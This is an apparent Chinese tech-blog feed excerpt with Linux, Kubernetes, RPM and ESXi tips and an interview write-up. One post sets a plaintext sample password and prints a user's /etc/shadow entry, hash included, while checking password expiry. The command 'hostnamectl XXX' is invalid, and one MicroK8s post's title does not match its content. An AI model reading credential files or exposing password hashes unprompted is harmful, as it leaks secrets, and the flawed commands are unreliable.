<h2 id="如果我打包时不想带上文件路径，怎么操作？"><a href="#如果我打包时不想带上文件路径，怎么操作？" class="headerlink" title="如果我打包时不想带上文件路径，怎么操作？"></a>如果我打包时不想带上文件路径，怎么操作？</h2><span id="more"></span>

<p>利用-C参数，方法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar -zcf hello.tar.gz -C dir1/ file1.txt -C ../dir2/ file2.txt -C dir3/ file3.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file1.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 file2.txt</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 file3.txt</span><br></pre></td></tr></table></figure>

<p>tar用法参考手册：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar --help</span><br><span class="line">Local file selection:</span><br><span class="line">-C, --directory=DIR        change to directory DIR</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>tar</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 Trend Micro 社招面经</title>
    <url>/2022/03/20/2022-03-20-trendmicro-job-interview/</url>
    <content><![CDATA[<h2 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h2><ul>
<li>985&#x2F;211本科，2年Linux C&#x2F;C++经验</li>
<li>2022-02-25 官网投递简历，职位：Linux开发</li>
</ul>
<h2 id="面试流程"><a href="#面试流程" class="headerlink" title="面试流程"></a>面试流程</h2><span id="more"></span>

<h3 id="机试"><a href="#机试" class="headerlink" title="机试"></a>机试</h3><p>时间：2022-02-27 19:00:00</p>
<p>两道编程题，要求1小时内完成，机试用的是牛客网链接，没有自动补全。题目如下，非常简单：</p>
<ul>
<li><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/">LeetCode 121 买卖股票的最佳时机</a> —— 双指针</p>
</li>
<li><p><a href="https://leetcode-cn.com/problems/number-of-islands/">LeetCode 200 岛屿数量</a> —— DFS、BFS</p>
</li>
</ul>
<h3 id="技术一面"><a href="#技术一面" class="headerlink" title="技术一面"></a>技术一面</h3><p>时间：2022-03-03 12:00:00</p>
<p>线上面试，用的微软Teams，二对一，80min</p>
<ul>
<li><p>中文自我介绍</p>
</li>
<li><p>问项目（30min）</p>
<ul>
<li>简单介绍项目（项目名称、背景、目标客户、完成基本事情、做了多久、项目规模、用到技术点）</li>
<li>问实现细节（背景、难点、如何解决、成果、为什么用这个方案、优化点）</li>
<li>举一个项目中你遇到的难题，如何解决的</li>
<li>你的项目中为什么用Redis，不用MySQL</li>
<li>……</li>
</ul>
</li>
<li><p>1道编程题 （15min）</p>
<ul>
<li>编写程序，生成长度为N的随机字符串，求最长的合法字母子串</li>
</ul>
</li>
<li><p>技术问题（25min）</p>
<ul>
<li>给每个中国人分一个IP地址，够分吗</li>
<li>TCP相比UDP来说是可靠的，这种说法对吗</li>
<li>后台服务变慢，谈谈你的定位思路</li>
<li>Linux进程内存布局（Text, Data, BSS, Stack, Heap …）</li>
<li>Redis过期键的实现原理，过期时间怎么存储的</li>
<li>Redis缓存逐出策略</li>
<li>全中国人的数据能放到一张MySQL表里吗</li>
<li>MySQL中，人名用什么类型存储，住址用什么类型存储</li>
<li>Linux下如何定时备份一个文件</li>
</ul>
</li>
<li><p>其它问题（10min）</p>
<ul>
<li>同事对你的评价</li>
<li>你的缺点是什么</li>
<li>同事觉得你有什么阴暗面</li>
<li>你还有什么要问的？（问前期负责哪些工作内容）</li>
</ul>
</li>
</ul>
<h3 id="技术二面"><a href="#技术二面" class="headerlink" title="技术二面"></a>技术二面</h3><p>时间：2022-03-04 12:15:00</p>
<p>现场面试，二对一，50min</p>
<ul>
<li><p>中文自我介绍</p>
</li>
<li><p>简单问项目（10min）</p>
</li>
<li><p>什么是僵尸进程，什么条件会出现？（没答好，把僵尸进程和孤儿进程混为一谈了~）</p>
</li>
<li><p>你在项目组里还负责了哪些项目和工作</p>
</li>
<li><p>你为什么说离职是因为学不到新技术呢（挖离职原因）</p>
</li>
<li><p>你平时用到的开发工具和编程语言</p>
</li>
<li><p>说下你的团队成员组成</p>
</li>
<li><p>说说你最近在看的书</p>
</li>
<li><p>你的机试两题都做对了，平时是经常刷题吗？来简单做1道题吧 （15min，没做出来…）</p>
<ul>
<li><a href="https://leetcode-cn.com/problems/pile-box-lcci/">Hard 堆箱子</a>   —— 动态规划、最长上升子序列</li>
</ul>
</li>
<li><p>项目中遇到别人不配合你的工作怎么办</p>
</li>
<li><p>你在项目中怎么合作的，怎么跨部门合作的</p>
</li>
<li><p>评价你同事的水平</p>
</li>
<li><p>有没有感觉有技术能力比较弱的同事</p>
</li>
<li><p>你还有什么问题（问团队成员组成）</p>
</li>
</ul>
<h3 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h3><p>时间：2022-03-04 13:30:00</p>
<p>现场面试，一对一，30min</p>
<ul>
<li><p>自我介绍</p>
</li>
<li><p>为什么选择我们公司，选择这个职位</p>
</li>
<li><p>你为什么离职</p>
</li>
<li><p>你当初考虑XX公司的原因是什么</p>
</li>
<li><p>你有考虑过内部转岗吗</p>
</li>
<li><p>你的期望薪酬（问薪酬结构，福利待遇）</p>
</li>
<li><p>你同事对你的评价</p>
</li>
<li><p>说说你的优点</p>
</li>
<li><p>你还有什么问题？（问晋升机制，职位空缺原因）</p>
</li>
</ul>
<h2 id="面试感受"><a href="#面试感受" class="headerlink" title="面试感受"></a>面试感受</h2><p>趋势的面试效率很高，从投递简历到拿到offer在2周内完成</p>
<p>全程接触的面试官、HR都很nice，整个过程是一个平等的对话交流，体验很好</p>
<h2 id="总结和反思"><a href="#总结和反思" class="headerlink" title="总结和反思"></a>总结和反思</h2><ul>
<li>永远不要等自己觉得完全准备好了再投递简历。本身面试运气成分就很大，而且机会稍纵即逝，等你觉得完全准备好了，可能岗位都已经没HC了</li>
<li>遇到不会的技术问题不要不懂装懂，可以说自己的项目没涉及这方面。因为面试官看你一知半解就会把你问到不会为止~</li>
<li>对算法题的重视程度不够（一道常见DP都没做出来~）。如果是短期准备面试，刷题方法可参考：<a href="https://zhuanlan.zhihu.com/p/349940945">Leetcode面试高频题分类刷题总结</a></li>
<li>八股文没怎么准备。背八股文就像考前突击应试，虽然大家都很讨厌做这个事，但不得不承认它的确对面试有帮助。。。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>以下是准备面试过程中的一些参考资料：</p>
<p>【1】<a href="https://zhuanlan.zhihu.com/p/349940945">Leetcode面试高频题分类刷题总结</a></p>
<p>【2】<a href="https://github.com/huihut/interview">C&#x2F;C++ 技术面试（八股文）</a></p>
<p>【3】<a href="https://github.com/0voice/interview_internal_reference">2021年最新总结，阿里，腾讯，百度，美团，头条等技术面试题目，以及答案</a></p>
<p>【3】<a href="https://cloud.tencent.com/developer/article/1785952">10 个 GitHub 上最火的程序员简历项目</a></p>
<p>【4】<a href="https://blog.csdn.net/icecoola_/article/details/78677435">程序员自我介绍</a></p>
<p>【5】<a href="https://yongluo2013.github.io/questions-for-english-interview/">外企面试最常见的36个英文问题</a></p>
<p>【6】<a href="https://www.zhihu.com/question/60591411">面试时问到我的项目经历，是在问我什么呢？</a></p>
<p>【7】<a href="https://zhuanlan.zhihu.com/p/87908851">HR面试70问</a></p>
<p>【8】<a href="https://github.com/formulahendry/955.WLB">955.WLB</a></p>
]]></content>
      <categories>
        <category>interview</category>
      </categories>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s删除namespace失败, 陷入Terminating状态解决方法</title>
    <url>/2022/11/16/2022-11-06-k8s-delete-ns-failed-case/</url>
    <content><![CDATA[<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>强制删除deployment和pod后，问题解决：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl -n <span class="variable">$&#123;ns&#125;</span> delete deployment --all --force</span><br><span class="line">kubectl -n <span class="variable">$&#123;ns&#125;</span> delete pod --all --force</span><br></pre></td></tr></table></figure>
<p>判断namespace的状态是否为Terminating：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">check_if_namespace_is_terminating</span></span>() &#123;</span><br><span class="line">    status=$(kubectl get ns <span class="variable">$&#123;ns&#125;</span> -o json | jq .status.phase -r)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$status</span>&quot;</span> = <span class="string">&quot;Terminating&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">return</span> 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>其他解决方法参考：</p>
<ul>
<li><a href="https://www.ibm.com/docs/en/cloud-private/3.2.0?topic=console-namespace-is-stuck-in-terminating-state">A namespace is stuck in the Terminating state</a></li>
<li><a href="https://medium.com/%E8%BC%95%E9%AC%86%E5%B0%8F%E5%93%81-pks%E8%88%87k8s%E7%9A%84%E9%BB%9E%E6%BB%B4/%E7%A7%BB%E9%99%A4%E8%A9%B2%E6%AD%BB%E7%9A%84terminating-namespace-c6594ebe351">移除該死的Terminating Namespace</a></li>
</ul>
<p>原因参考：</p>
<ul>
<li><a href="https://cloud.tencent.com/developer/article/1802531">删除namespace为什么会Terminating</a></li>
</ul>
]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>RPM打包时指定python自动编译版本为3.X的方法</title>
    <url>/2023/02/01/2023-02-01-rpm-build-use-python3/</url>
    <content><![CDATA[<h3 id="指定python自动编译的版本为python3的方法"><a href="#指定python自动编译的版本为python3的方法" class="headerlink" title="指定python自动编译的版本为python3的方法"></a>指定python自动编译的版本为python3的方法</h3><p>在spec文件里添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define  __python /usr/bin/python3</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="RPM打包时关闭python自动编译的方法"><a href="#RPM打包时关闭python自动编译的方法" class="headerlink" title="RPM打包时关闭python自动编译的方法"></a>RPM打包时关闭python自动编译的方法</h3><p>编辑 <code>/usr/lib/rpm/redhat/macros</code>， 注释掉<code>brp-python-bytecompile</code>一行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%__os_install_post    \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-compress \</span><br><span class="line">    %&#123;!?__debug_package:\</span><br><span class="line">    /usr/lib/rpm/redhat/brp-strip %&#123;__strip&#125; \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-strip-comment-note %&#123;__strip&#125; %&#123;__objdump&#125; \</span><br><span class="line">    &#125; \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-strip-static-archive %&#123;__strip&#125; \</span><br><span class="line">    /usr/lib/rpm/brp-python-bytecompile %&#123;__python&#125; %&#123;?_python_bytecompile_errors_terminate_build&#125; \</span><br><span class="line">    /usr/lib/rpm/redhat/brp-python-hardlink \</span><br><span class="line">    %&#123;!?__jar_repack:/usr/lib/rpm/redhat/brp-java-repack-jars&#125; \</span><br><span class="line">%&#123;nil&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>RPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7中修改hostname的方法</title>
    <url>/2023/02/13/2023-02-13-change-hostname-in-centos7/</url>
    <content><![CDATA[<h2 id="hostname临时修改主机名"><a href="#hostname临时修改主机名" class="headerlink" title="hostname临时修改主机名"></a>hostname临时修改主机名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostname XXX</span><br></pre></td></tr></table></figure>
<h2 id="hostnamectl永久修改主机名"><a href="#hostnamectl永久修改主机名" class="headerlink" title="hostnamectl永久修改主机名"></a>hostnamectl永久修改主机名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostnamectl XXX</span><br></pre></td></tr></table></figure>
<p>修改的内容实际是文件<code>/etc/hostname</code></p>
<h2 id="三种主机名的区别"><a href="#三种主机名的区别" class="headerlink" title="三种主机名的区别"></a>三种主机名的区别</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man hostnamectl</span><br><span class="line">This tool distinguishes three different hostnames: </span><br><span class="line">the high-level <span class="string">&quot;pretty&quot;</span> hostname <span class="built_in">which</span> might include all kinds of special characters (e.g. <span class="string">&quot;Lennart&#x27;s Laptop&quot;</span>), </span><br><span class="line">the static hostname <span class="built_in">which</span> is used to initialize the kernel hostname at boot (e.g. <span class="string">&quot;lennarts-laptop&quot;</span>), </span><br><span class="line">and the transient hostname <span class="built_in">which</span> is a default received from network configuration. If a static hostname is <span class="built_in">set</span>, and is valid (something other than localhost), <span class="keyword">then</span> the transient hostname is not used.</span><br></pre></td></tr></table></figure>
<h2 id="Centos7中，hostnamectl-–static命令读取的实际是-etc-hostname文件的内容"><a href="#Centos7中，hostnamectl-–static命令读取的实际是-etc-hostname文件的内容" class="headerlink" title="Centos7中，hostnamectl –static命令读取的实际是&#x2F;etc&#x2F;hostname文件的内容"></a>Centos7中，hostnamectl –static命令读取的实际是&#x2F;etc&#x2F;hostname文件的内容</h2><p><code>hostnamectl</code>源码参考：<a href="https://github.com/systemd/systemd">https://github.com/systemd/systemd</a><br><code>hostnamectl --static</code>函数调用梳理如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DEFINE_MAIN_FUNCTION(run);</span><br><span class="line">hostnamectl_main func table</span><br><span class="line">get_or_set_hostname</span><br><span class="line">get_hostname_based_on_flag</span><br><span class="line"><span class="title function_">get_one_name</span><span class="params">(bus, <span class="string">&quot;StaticHostname&quot;</span>, <span class="literal">NULL</span>)</span>;</span><br><span class="line">sd_bus_get_property</span><br><span class="line">sd_bus_call_method</span><br><span class="line"><span class="title function_">sd_bus_call_methodv</span><span class="params">()</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> BusObjectImplementation manager_object = &#123;</span><br><span class="line">        <span class="string">&quot;/org/freedesktop/hostname1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;org.freedesktop.hostname1&quot;</span>,</span><br><span class="line">        .vtables = BUS_VTABLES(hostname_vtable),</span><br><span class="line">&#125;;</span><br><span class="line">hostname_vtable</span><br><span class="line"><span class="title function_">SD_BUS_PROPERTY</span><span class="params">(<span class="string">&quot;StaticHostname&quot;</span>, <span class="string">&quot;s&quot;</span>, property_get_static_hostname, <span class="number">0</span>, SD_BUS_VTABLE_PROPERTY_EMITS_CHANGE)</span></span><br><span class="line">property_get_static_hostname </span><br><span class="line">context_read_etc_hostname</span><br><span class="line">read_etc_hostname</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_etc_hostname</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> **ret)</span> &#123;</span><br><span class="line">        _cleanup_fclose_ FILE *f = <span class="literal">NULL</span>;</span><br><span class="line">        assert(ret);</span><br><span class="line">        <span class="keyword">if</span> (!path)</span><br><span class="line">                path = <span class="string">&quot;/etc/hostname&quot;</span>;</span><br><span class="line">        f = fopen(path, <span class="string">&quot;re&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!f)</span><br><span class="line">                <span class="keyword">return</span> -errno;</span><br><span class="line">        <span class="keyword">return</span> read_etc_hostname_stream(f, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，最终调用<code>read_etc_hostname</code>读取<code>/etc/hostname</code>的内容</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux设置用户密码XX天后失效的方法</title>
    <url>/2023/02/13/2023-02-13-set-password-expire-after-specified-days/</url>
    <content><![CDATA[<ol>
<li>新增用户<code>peter</code>并设置密码<code>huawei@123</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd peter</span><br><span class="line">echo peter:huawei@123 | chpasswd</span><br></pre></td></tr></table></figure></li>
<li>使用<code>chage</code>命令设置密码过期时间，这里设置7天后密码过期，过期后立即失效<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chage -m 0 -M 7 -I 0 peter</span><br></pre></td></tr></table></figure>
<span id="more"></span></li>
</ol>
<p><code>chage</code>命令用法参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chage -l</span><br><span class="line">  -I, --inactive INACTIVE       set password inactive after expiration</span><br><span class="line">                                to INACTIVE</span><br><span class="line">  -l, --list                    show account aging information</span><br><span class="line">  -m, --mindays MIN_DAYS        set minimum number of days before password</span><br><span class="line">                                change to MIN_DAYS</span><br><span class="line">  -M, --maxdays MAX_DAYS        set maximum number of days before password</span><br><span class="line">                                change to MAX_DAYS</span><br></pre></td></tr></table></figure>
<p>查看信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">chage -l peter</span></span><br><span class="line">Last password change                                    : Feb 13, 2023</span><br><span class="line">Password expires                                        : Feb 20, 2023</span><br><span class="line">Password inactive                                       : Feb 20, 2023</span><br><span class="line">Account expires                                         : never</span><br><span class="line">Minimum number of days between password change          : 0</span><br><span class="line">Maximum number of days between password change          : 7</span><br><span class="line">Number of days of warning before password expires       : 7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/shadow | grep peter</span></span><br><span class="line">peter:$6$XIgc5bJIYhYHSc$Rf0yw7MD2HRPecEwJr9VlshwzBWre6al2lwsfGeB2uVcq1pQaxz2tyvb2r9RtQCSls1sAddjs3BRUCN8IF8fR.:19401:0:7:7:0::</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware Esxi Access to resource settings on the host is restricted to the server...解决方法</title>
    <url>/2023/02/13/2023-02-13-vmware-esxi-access-to-resource-settings-error/</url>
    <content><![CDATA[<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
<li>先enable ESXI主机的SSH连接，参考：<a href="https://www.uccollabing.com/2016/05/12/enable-ssh-on-vsphere-esxi/">https://www.uccollabing.com/2016/05/12/enable-ssh-on-vsphere-esxi/</a></li>
<li>再重启vpxa服务，如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/vpxa stop ; /etc/init.d/hostd restart</span><br><span class="line"></span><br><span class="line">删掉 /etc/vmware/vpxa/vpxa.cfg 文件中 &lt;vpxa/&gt; 的内容</span><br><span class="line"></span><br><span class="line">/etc/init.d/vpxa start</span><br></pre></td></tr></table></figure>
<span id="more"></span></li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.uccollabing.com/esxi-access-to-resource-settings-on-the-host-is-restricted-to-the-server-that-is-managing-it/">https://www.uccollabing.com/esxi-access-to-resource-settings-on-the-host-is-restricted-to-the-server-that-is-managing-it/</a></p>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>RPM打包删除/usr/lib/.buildid目录的方法</title>
    <url>/2023/03/01/2023-03-01-delete-folder-builid-when-use-rpm/</url>
    <content><![CDATA[<p>Add following line to spec file</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%define _build_id_links none</span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://gohalo.me/post/linux-create-rpm-package.html">https://gohalo.me/post/linux-create-rpm-package.html</a></p>
]]></content>
      <categories>
        <category>RPM</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>RPM</tag>
      </tags>
  </entry>
  <entry>
    <title>如何查看Microk8s的apiserver证书过期时间</title>
    <url>/2023/03/30/2023-03-30-how-to-lookup-apiserver-cert-expired-time-in-microk8s/</url>
    <content><![CDATA[<h2 id="在线安装Microk8s"><a href="#在线安装Microk8s" class="headerlink" title="在线安装Microk8s"></a>在线安装Microk8s</h2><ol>
<li><p>安装snap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y epel-release</span><br><span class="line">yum install -y snapd</span><br><span class="line">systemctl enable --now snapd.socket</span><br><span class="line">systemctl start snapd</span><br><span class="line">ln -s /var/lib/snapd/snap /snap</span><br></pre></td></tr></table></figure>
<span id="more"></span>
</li>
<li><p>安装microk8s</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap install microk8s --classic --channel=1.23/stable</span><br><span class="line">snap <span class="built_in">alias</span> microk8s.kubectl kubectl</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>安装microk8s插件(addons)<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s <span class="built_in">enable</span> dns ingress metrics-server</span><br></pre></td></tr></table></figure></li>
</ol>
<p>成功安装后，通过kubectl查看Pod和Image</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pods -A</span></span><br><span class="line">kube-system   calico-node-srvfr                         1/1     Running   0          11m</span><br><span class="line">kube-system   calico-kube-controllers-5b577d865-xwqjh   1/1     Running   0          11m</span><br><span class="line">kube-system   coredns-64c6478b6c-fcvkk                  1/1     Running   0          23s</span><br><span class="line">ingress       nginx-ingress-microk8s-controller-rqtj2   1/1     Running   0          32s</span><br><span class="line">kube-system   metrics-server-679c5f986d-vb6z7           1/1     Running   0          53m</span><br><span class="line"></span><br><span class="line">microk8s.ctr i list | grep -vw DIGEST | grep -v ^sha256 | grep -v @sha256 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">docker.io/calico/cni:v3.19.1</span><br><span class="line">docker.io/calico/kube-controllers:v3.17.3</span><br><span class="line">docker.io/calico/node:v3.19.1</span><br><span class="line">docker.io/calico/pod2daemon-flexvol:v3.19.1</span><br><span class="line">docker.io/coredns/coredns:1.8.0</span><br><span class="line">k8s.gcr.io/ingress-nginx/controller:v1.5.1</span><br><span class="line">k8s.gcr.io/metrics-server/metrics-server:v0.5.2</span><br><span class="line">k8s.gcr.io/pause:3.1</span><br></pre></td></tr></table></figure>

<h2 id="离线安装Microk8s"><a href="#离线安装Microk8s" class="headerlink" title="离线安装Microk8s"></a>离线安装Microk8s</h2><ol>
<li><p>在可联网的环境下载Microk8s的snap安装包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap download microk8s --channel=1.23/stable <span class="comment"># 下载指定版本1.23</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将下载好的snap包传输到目标机器上，安装microk8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap ack microk8s_&lt;版本号&gt;.assert</span><br><span class="line">snap install microk8s_&lt;版本号&gt;.snap --classic</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动Microk8s服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s start</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动microk8s插件(可选)</p>
</li>
</ol>
<p>在可联网的环境下载Microk8s插件的Image并导出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.ctr i list | grep -vw DIGEST | grep -v ^sha256 | grep -v @sha256 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">docker.io/calico/cni:v3.19.1</span><br><span class="line">docker.io/calico/kube-controllers:v3.17.3</span><br><span class="line">docker.io/calico/node:v3.19.1</span><br><span class="line">docker.io/calico/pod2daemon-flexvol:v3.19.1</span><br><span class="line">docker.io/coredns/coredns:1.8.0</span><br><span class="line">k8s.gcr.io/ingress-nginx/controller:v1.5.1</span><br><span class="line">k8s.gcr.io/metrics-server/metrics-server:v0.5.2</span><br><span class="line">k8s.gcr.io/pause:3.1</span><br><span class="line"></span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> cni.tar docker.io/calico/cni:v3.19.1</span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> kube-controllers.tar docker.io/calico/kube-controllers:v3.17.3</span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> .....</span><br></pre></td></tr></table></figure>
<p>将image传到目标机器上并导入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.ctr image import *.tar</span><br></pre></td></tr></table></figure>
<p>启动microk8s插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s <span class="built_in">enable</span> dns ingress metrics-server</span><br><span class="line">microk8s status --wait-ready</span><br></pre></td></tr></table></figure>

<p>配置kubectl访问Microk8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.kubectl config view --raw &gt; <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>

<h2 id="卸载microk8s"><a href="#卸载microk8s" class="headerlink" title="卸载microk8s"></a>卸载microk8s</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s stop </span><br><span class="line">snap remove microk8s</span><br><span class="line"><span class="built_in">rm</span> -rf /root/.kube</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在Centos7上安装Microk8s</title>
    <url>/2023/03/31/2023-03-31-how-to-install-microk8s-on-centos7/</url>
    <content><![CDATA[<h2 id="在线安装Microk8s"><a href="#在线安装Microk8s" class="headerlink" title="在线安装Microk8s"></a>在线安装Microk8s</h2><ol>
<li><p>安装snap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y epel-release</span><br><span class="line">yum install -y snapd</span><br><span class="line">systemctl enable --now snapd.socket</span><br><span class="line">systemctl start snapd</span><br><span class="line">ln -s /var/lib/snapd/snap /snap</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装microk8s</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap install microk8s --classic --channel=1.23/stable</span><br><span class="line">snap <span class="built_in">alias</span> microk8s.kubectl kubectl</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<ol start="3">
<li>安装microk8s插件(addons)<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s <span class="built_in">enable</span> dns ingress metrics-server</span><br></pre></td></tr></table></figure></li>
</ol>
<p>成功安装后，通过kubectl查看Pod和Image</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pods -A</span></span><br><span class="line">kube-system   calico-node-srvfr                         1/1     Running   0          11m</span><br><span class="line">kube-system   calico-kube-controllers-5b577d865-xwqjh   1/1     Running   0          11m</span><br><span class="line">kube-system   coredns-64c6478b6c-fcvkk                  1/1     Running   0          23s</span><br><span class="line">ingress       nginx-ingress-microk8s-controller-rqtj2   1/1     Running   0          32s</span><br><span class="line">kube-system   metrics-server-679c5f986d-vb6z7           1/1     Running   0          53m</span><br><span class="line"></span><br><span class="line">microk8s.ctr i list | grep -vw DIGEST | grep -v ^sha256 | grep -v @sha256 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">docker.io/calico/cni:v3.19.1</span><br><span class="line">docker.io/calico/kube-controllers:v3.17.3</span><br><span class="line">docker.io/calico/node:v3.19.1</span><br><span class="line">docker.io/calico/pod2daemon-flexvol:v3.19.1</span><br><span class="line">docker.io/coredns/coredns:1.8.0</span><br><span class="line">k8s.gcr.io/ingress-nginx/controller:v1.5.1</span><br><span class="line">k8s.gcr.io/metrics-server/metrics-server:v0.5.2</span><br><span class="line">k8s.gcr.io/pause:3.1</span><br></pre></td></tr></table></figure>

<h2 id="离线安装Microk8s"><a href="#离线安装Microk8s" class="headerlink" title="离线安装Microk8s"></a>离线安装Microk8s</h2><ol>
<li><p>在可联网的环境下载Microk8s的snap安装包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap download microk8s --channel=1.23/stable <span class="comment"># 下载指定版本1.23</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将下载好的snap包传输到目标机器上，安装microk8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap ack microk8s_&lt;版本号&gt;.assert</span><br><span class="line">snap install microk8s_&lt;版本号&gt;.snap --classic</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动Microk8s服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s start</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动microk8s插件(可选)</p>
</li>
</ol>
<p>在可联网的环境下载Microk8s插件的Image并导出</p>
